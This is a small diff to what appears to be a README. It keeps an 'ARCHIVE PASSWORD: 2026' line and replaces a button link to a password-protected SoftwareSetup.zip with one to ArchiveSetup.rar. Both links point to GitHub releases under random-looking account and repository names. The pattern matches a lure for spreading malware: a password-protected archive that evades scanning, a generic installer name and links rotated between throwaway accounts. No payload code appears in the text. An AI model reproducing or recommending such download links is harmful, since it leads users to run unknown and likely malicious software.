@@ -1,3 +1,3 @@
 # ARCHIVE PASSWORD: 2026
 
-[![button](pic.jpg)](https://github.com/Magmafuoscillate/gasplpnz/releases/download/kjfgb/SoftwareSetup.zip)
+[![button](pic.jpg)](https://github.com/beachwarblersteeple/wfizizjv/releases/download/osdap/ArchiveSetup.rar)
